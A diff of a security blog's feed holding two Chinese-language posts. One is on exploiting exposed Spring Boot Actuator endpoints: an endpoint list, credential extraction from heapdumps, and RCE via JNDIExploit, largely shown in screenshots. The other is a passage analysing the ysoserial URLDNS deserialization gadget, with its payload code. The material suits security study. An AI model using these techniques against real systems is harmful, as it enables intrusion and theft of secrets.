+                                <category scheme="https://l1uyun.one/tags/sec" term="sec" label="sec" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        
+        <entry>
+            <title type="html"><![CDATA[springboot利用]]></title><link href="https://l1uyun.one/posts/javasec-springboot%E6%A1%86%E6%9E%B6%E5%88%A9%E7%94%A8/" rel="alternate" type="text/html" />
+            <id>https://l1uyun.one/posts/javasec-springboot%E6%A1%86%E6%9E%B6%E5%88%A9%E7%94%A8/</id>
+            
+            <published>2024-08-06T09:32:00+08:00</published>
+            <updated>2025-09-29T20:53:09+08:00</updated>
+            
+            
+            <content type="html"><![CDATA[<h1 id="springboot利用">springboot利用</h1>
+<h1 id="前置知识">前置知识</h1>
+<h2 id="springboot-actuator">SpringBoot Actuator</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 / ，2.x 版本则统一以 /actuator 为起始路径
+</span></span><span style="display:flex;"><span>Spring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv
+</span></span></code></pre></div><p>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 “默认安全” 来讲，不暴露出这些信息更加安全。</p>
+<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p>
+<h2 id="配置不当而暴露的路由">配置不当而暴露的路由</h2>
+<p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
+<p>因为配置不当而暴露的默认内置路由可能会有：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/actuator
+</span></span><span style="display:flex;"><span>/auditevents
+</span></span><span style="display:flex;"><span>/autoconfig
+</span></span><span style="display:flex;"><span>/beans
+</span></span><span style="display:flex;"><span>/caches
+</span></span><span style="display:flex;"><span>/conditions
+</span></span><span style="display:flex;"><span>/configprops
+</span></span><span style="display:flex;"><span>/docs
+</span></span><span style="display:flex;"><span>/dump
+</span></span><span style="display:flex;"><span>/env
+</span></span><span style="display:flex;"><span>/flyway
+</span></span><span style="display:flex;"><span>/health
+</span></span><span style="display:flex;"><span>/heapdump
+</span></span><span style="display:flex;"><span>/httptrace
+</span></span><span style="display:flex;"><span>/info
+</span></span><span style="display:flex;"><span>/intergrationgraph
+</span></span><span style="display:flex;"><span>/jolokia
+</span></span><span style="display:flex;"><span>/logfile
+</span></span><span style="display:flex;"><span>/loggers
+</span></span><span style="display:flex;"><span>/liquibase
+</span></span><span style="display:flex;"><span>/metrics
+</span></span><span style="display:flex;"><span>/mappings
+</span></span><span style="display:flex;"><span>/prometheus
+</span></span><span style="display:flex;"><span>/refresh
+</span></span><span style="display:flex;"><span>/scheduledtasks
+</span></span><span style="display:flex;"><span>/sessions
+</span></span><span style="display:flex;"><span>/shutdown
+</span></span><span style="display:flex;"><span>/trace
+</span></span><span style="display:flex;"><span>/threaddump
+</span></span><span style="display:flex;"><span>/actuator/auditevents
+</span></span><span style="display:flex;"><span>/actuator/beans
+</span></span><span style="display:flex;"><span>/actuator/health
+</span></span><span style="display:flex;"><span>/actuator/conditions
+</span></span><span style="display:flex;"><span>/actuator/configprops
+</span></span><span style="display:flex;"><span>/actuator/env
+</span></span><span style="display:flex;"><span>/actuator/info
+</span></span><span style="display:flex;"><span>/actuator/loggers
+</span></span><span style="display:flex;"><span>/actuator/heapdump
+</span></span><span style="display:flex;"><span>/actuator/threaddump
+</span></span><span style="display:flex;"><span>/actuator/metrics
+</span></span><span style="display:flex;"><span>/actuator/scheduledtasks
+</span></span><span style="display:flex;"><span>/actuator/httptrace
+</span></span><span style="display:flex;"><span>/actuator/mappings
+</span></span><span style="display:flex;"><span>/actuator/jolokia
+</span></span><span style="display:flex;"><span>/actuator/hystrix.stream
+</span></span></code></pre></div><p>其中对寻找漏洞比较重要接口的有：</p>
+<p>/env、/actuator/env
+GET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p>
+<p>同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
+<p>/refresh、/actuator/refresh
+POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。</p>
+<p>/restart、/actuator/restart
+暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。</p>
+<p>/jolokia、/actuator/jolokia
+可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
+<p>/trace、/actuator/httptrace
+一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
+<h2 id="漏洞检测">漏洞检测</h2>
+<h3 id="检测清单">检测清单</h3>
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/LandGrey/SpringBootVulExploit</a>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_1.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_2.png" alt="" /></figure>
+
+
+</p>
+<h3 id="黑盒发现">黑盒发现</h3>
+<p>人工识别，BP插件</p>
+<p>人工识别
+1、网站图片文件是一个绿色的树叶。2、特有的报错信息。3、Whitelabel Error Page关键字
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_3.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
+<p>BP插件
+<a href="https://github.com/API-Security/APIKit" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/API-Security/APIKit</a>
+打开BurpSuite页面,点击Extender然后选择Extensions,添加APIKit.jar
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_4.png" alt="" /></figure>
+
+
+
+安装好插件后啥都不用管，让数据包经过BP即可触发插件被动扫描
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_5.png" alt="|800" /><figcaption>|800</figcaption></figure>
+
+
+</p>
+<h3 id="白盒发现">白盒发现</h3>
+<p>pom.xml,引用库</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>spring-boot-starter-actuator<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>配置文件Actuator设置全部暴露<code>management.endpoints.web.exposure.include=*</code>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_6.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_7.png" alt="" /></figure>
+
+
+</p>
+<h2 id="信息泄露利用">信息泄露利用</h2>
+<h3 id="内部路由泄露">内部路由泄露</h3>
+<p><a href="https://github.com/AabyssZG/SpringBoot-Scan" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/AabyssZG/SpringBoot-Scan</a>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_8.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_9.png" alt="" /></figure>
+
+
+</p>
+<h3 id="heapdump敏感信息查询">heapdump敏感信息查询</h3>
+<p>配置密码，AK/SK等</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_10.png" alt="|800" /><figcaption>|800</figcaption></figure>
+
+
+</p>
+<p>下载下来
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_11.png" alt="" /></figure>
+
+
+
+然后使用JDumpSPider工具来获取数据
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_12.png" alt="" /></figure>
+
+
+</p>
+<p>![](<a href="https://img.l1uyun.one/Pasted" target="_blank" rel="noopener nofollow noreferrer" >https://img.l1uyun.one/Pasted</a> image 20240806101506.png)</p>
+<p>这里还有另外一款工具,支持关键词搜索
+<a href="https://github.com/wyzxxz/heapdump_tool" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/wyzxxz/heapdump_tool</a>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_14.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_15.png" alt="|850" /><figcaption>|850</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_16.png" alt="" /></figure>
+
+
+</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="框架漏洞">框架漏洞</h3>
+<p><a href="https://github.com/AabyssZG/SpringBoot-Scan" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/AabyssZG/SpringBoot-Scan</a>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_17.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_18.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_19.png" alt="" /></figure>
+
+
+</p>
+<h3 id="利用类漏洞来进行rce攻击">利用类漏洞来进行RCE攻击</h3>
+<p>服务器上执行JNDIExploit工具(可以本地、也可以远程VPS上运行)
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_20.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_21.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_22.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_23.png" alt="" /></figure>
+
+
+</p>
+<h1 id="cms源码审计">CMS源码审计</h1>
+<h2 id="安装源码">安装源码</h2>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_24.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_25.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_26.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_27.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_28.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_29.png" alt="" /></figure>
+
+
+
+起始就是把actuator的接口做了可视化
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_30.png" alt="" /></figure>
+
+
+</p>
+<h2 id="源码审计">源码审计</h2>
+<p>从pom.xml看有没有调用Actuator库
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_31.png" alt="" /></figure>
+
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>配置文件中Actuator设置是否为*(全部暴露)
+</span></span><span style="display:flex;"><span>management.endpoints.web.exposure.include=*
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_32.png" alt="|700" /><figcaption>|700</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_33.png" alt="|700" /><figcaption>|700</figcaption></figure>
+
+
+</p>
+<p>泄露安全(heapdump)
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_34.png" alt="" /></figure>
+
+
+
+使用heapdump敏感信息查询工具提取敏感信息
+JDumpSpider
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_35.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
+<h1 id="一句话总结">一句话总结</h1>
+<p>遇到springboot框架从两个方面去寻找安全问题：
+1.泄露安全(是否泄露了内部路由及heapdump)
+2.漏洞安全(利用相关框架漏洞检测工具测试是否存在漏洞)</p>
+<h1 id="参考">参考</h1>
+<p><a href="https://blog.csdn.net/m0_60571842/article/details/135096224" target="_blank" rel="noopener nofollow noreferrer" >WEB攻防-Java安全&amp;原生反序列化&amp;SpringBoot攻防&amp;heapdump提取&amp;CVE_java spring反序列化-CSDN博客</a></p>
+]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="https://l1uyun.one/tags/sec" term="sec" label="sec" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        
+        <entry>
+            <title type="html"><![CDATA[javasec-urldns链]]></title><link href="https://l1uyun.one/posts/javasec-urldns%E9%93%BE/" rel="alternate" type="text/html" />
+            <id>https://l1uyun.one/posts/javasec-urldns%E9%93%BE/</id>
+            
+            <published>2024-08-03T15:51:23+08:00</published>
+            <updated>2025-09-29T20:53:14+08:00</updated>
+            
+            
+            <content type="html"><![CDATA[<h1 id="urldns链">urldns链</h1>
+<p>URLDNS 是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p>
+<p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤</p>
+<ul>
+<li>使⽤Java内置的类构造，对第三⽅库没有依赖,因此对java版本没有限制</li>
+<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
+</ul>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="gadget">gadget</h3>
+<p>Java反序列化漏洞产生漏洞的形式大致有两种,</p>
+<ul>
+<li>一种是上下文入口类的readObject方法中直接包含了危险操作(危险函数)且传入危险函数的参数可控(这种情况很少)</li>
+<li>还有一种情况就是入口类的readObject方法中间接调用了其它类(B类),在B类中又调用了恶意的方法或调用了其它包含恶意方法的类,这种链式触发命令执行的结构被称为反序列化利用链,组成这种链式结构中的&quot;成员类&quot;被称为Gadget而这种链式结构被称为Gadget Chain,通过构造Gadget Chain可以进行反序列化攻击。</li>
+</ul>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>ysoserial里是这样生成payload的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>             <span style="color:#75715e">//Avoid DNS resolution during payload creation</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#75715e">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span>
+</span></span><span style="display:flex;"><span>             URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>             HashMap ht <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap(); <span style="color:#75715e">// HashMap that will contain the URL</span>
+</span></span><span style="display:flex;"><span>             URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">null</span>, url, handler); <span style="color:#75715e">// URL to use as the Key</span>
+</span></span><span style="display:flex;"><span>             ht.<span style="color:#a6e22e">put</span>(u, url); <span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>             Reflections.<span style="color:#a6e22e">setFieldValue</span>(u, <span style="color:#e6db74">&#34;hashCode&#34;</span>, <span style="color:#f92672">-</span>1); <span style="color:#75715e">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">return</span> ht;
+</span></span><span style="display:flex;"><span>     }
+</span></span><span style="display:flex;"><span>     
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span>(URL u) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>     }
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>     }
+</span></span><span style="display:flex;"><span> }
+</span></span></code></pre></div><p>利用链</p>
+<pre tabindex="0"><code>Gadget Chain:
+  HashMap.readObject()
+    HashMap.putVal()
+      HashMap.hash()
+        URL.hashCode()
+</code></pre><p>urldns是yso中较为简单的一个gadget，所以这里可以直接通过正向分析的方式进行分析</p>
+<p>看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap。因为触发反序列化的⽅法是 readObject,那么可以直奔 HashMap 类的 readObject ⽅法：</p>
+<p>HashMap#readObject</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span>
+</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">defaultReadObject</span>();
+</span></span><span style="display:flex;"><span>        reinitialize();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (loadFactor <span style="color:#f92672">&lt;=</span> 0 <span style="color:#f92672">||</span> Float.<span style="color:#a6e22e">isNaN</span>(loadFactor))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Illegal load factor: &#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                                             loadFactor);
+</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">readInt</span>();                <span style="color:#75715e">// Read and ignore number of buckets</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> mappings <span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readInt</span>(); <span style="color:#75715e">// Read number of mappings (size)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">&lt;</span> 0)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Illegal mappings count: &#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                                             mappings);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">&gt;</span> 0) { <span style="color:#75715e">// (if zero, use defaults)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Size the table using given load factor only if within</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// range of 0.25...4.0</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> lf <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">min</span>(Math.<span style="color:#a6e22e">max</span>(0.<span style="color:#a6e22e">25f</span>, loadFactor), 4.<span style="color:#a6e22e">0f</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> fc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)mappings <span style="color:#f92672">/</span> lf <span style="color:#f92672">+</span> 1.<span style="color:#a6e22e">0f</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> cap <span style="color:#f92672">=</span> ((fc <span style="color:#f92672">&lt;</span> DEFAULT_INITIAL_CAPACITY) <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                       DEFAULT_INITIAL_CAPACITY :
+</span></span><span style="display:flex;"><span>                       (fc <span style="color:#f92672">&gt;=</span> MAXIMUM_CAPACITY) <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                       MAXIMUM_CAPACITY :
+</span></span><span style="display:flex;"><span>                       tableSizeFor((<span style="color:#66d9ef">int</span>)fc));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> ft <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)cap <span style="color:#f92672">*</span> lf;
+</span></span><span style="display:flex;"><span>            threshold <span style="color:#f92672">=</span> ((cap <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY <span style="color:#f92672">&amp;&amp;</span> ft <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY) <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                         (<span style="color:#66d9ef">int</span>)ft : Integer.<span style="color:#a6e22e">MAX_VALUE</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@SuppressWarnings</span>({<span style="color:#e6db74">&#34;rawtypes&#34;</span>,<span style="color:#e6db74">&#34;unchecked&#34;</span>})
+</span></span><span style="display:flex;"><span>                Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> tab <span style="color:#f92672">=</span> (Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span>)<span style="color:#66d9ef">new</span> Node<span style="color:#f92672">[</span>cap<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            table <span style="color:#f92672">=</span> tab;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
+</span></span><span style="display:flex;"><span>                    K key <span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
+</span></span><span style="display:flex;"><span>                    V value <span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>                putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>putVal这一段，这里调用了hash方法来处理key，跟进hash方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span>(Object key) {
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">int</span> h;
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> (key <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> 0 : (h <span style="color:#f92672">=</span> key.<span style="color:#a6e22e">hashCode</span>()) <span style="color:#f92672">^</span> (h <span style="color:#f92672">&gt;&gt;&gt;</span> 16);
+</span></span><span style="display:flex;"><span>   }
+</span></span></code></pre></div><p>这里又调用了key.hashCode方法,这里的key是一个URL对象,让我们看看URL的hashCode方法：</p>
+<p>URL#hashCode：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
